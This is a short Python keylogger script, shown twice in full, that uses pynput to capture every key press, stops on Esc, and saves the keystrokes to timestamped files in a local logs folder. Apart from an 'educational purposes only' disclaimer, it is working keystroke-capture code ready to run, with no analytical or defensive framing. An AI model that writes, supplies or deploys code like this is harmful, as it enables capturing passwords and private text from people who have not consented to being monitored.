import os
from datetime import datetime
from pynput import keyboard

class BasicKeyLogger:
    def __init__(self, log_dir="logs", exit_key=keyboard.Key.esc):
        self.exit_key = exit_key
        self.log = []
        self.log_dir = log_dir
        os.makedirs(self.log_dir, exist_ok=True)
        self.log_file = self.create_log_file()

    def create_log_file(self):
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        return os.path.join(self.log_dir, f"KeyLog_{timestamp}.txt")

    def write_log(self):
        with open(self.log_file, "w") as f:
            f.write("Keylogger Log File\n")
            f.write(f"Session started: {datetime.now()}\n\n")
            for key in self.log:
                f.write(f"{key}\n")
        print(f"\n✅ Log saved to: {self.log_file}")

    def on_press(self, key):
        try:
            # Exit on the designated key
            if key == self.exit_key:
                print("\n🔴 Exit key detected. Exiting logger...")
                return False
            
            # Log printable characters
            if hasattr(key, 'char') and key.char:
                self.log.append(key.char)
            else:
                self.log.append(str(key))

        except Exception as e:
            print(f"⚠️ Error: {e}")

    def run(self):
        print(f"🔐 Keylogger started. Press '{self.exit_key}' to stop.")
        print("📁 Logs will be saved in the 'logs' directory.\n")

        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

        self.write_log()

# Run the logger
if __name__ == "__main__":
    print("⚠️ This keylogger is for educational purposes only. Use responsibly!")
    logger = BasicKeyLogger()
    logger.run()
import os
from datetime import datetime
from pynput import keyboard

class BasicKeyLogger:
    def __init__(self, log_dir="logs", exit_key=keyboard.Key.esc):
        self.exit_key = exit_key
        self.log = []
        self.log_dir = log_dir
        os.makedirs(self.log_dir, exist_ok=True)
        self.log_file = self.create_log_file()

    def create_log_file(self):
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        return os.path.join(self.log_dir, f"KeyLog_{timestamp}.txt")

    def write_log(self):
        with open(self.log_file, "w") as f:
            f.write("Keylogger Log File\n")
            f.write(f"Session started: {datetime.now()}\n\n")
            for key in self.log:
                f.write(f"{key}\n")
        print(f"\n✅ Log saved to: {self.log_file}")

    def on_press(self, key):
        try:
            # Exit on the designated key
            if key == self.exit_key:
                print("\n🔴 Exit key detected. Exiting logger...")
                return False
            
            # Log printable characters
            if hasattr(key, 'char') and key.char:
                self.log.append(key.char)
            else:
                self.log.append(str(key))

        except Exception as e:
            print(f"⚠️ Error: {e}")

    def run(self):
        print(f"🔐 Keylogger started. Press '{self.exit_key}' to stop.")
        print("📁 Logs will be saved in the 'logs' directory.\n")

        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

        self.write_log()

# Run the logger
if __name__ == "__main__":
    print("⚠️ This keylogger is for educational purposes only. Use responsibly!")
    logger = BasicKeyLogger()
    logger.run()
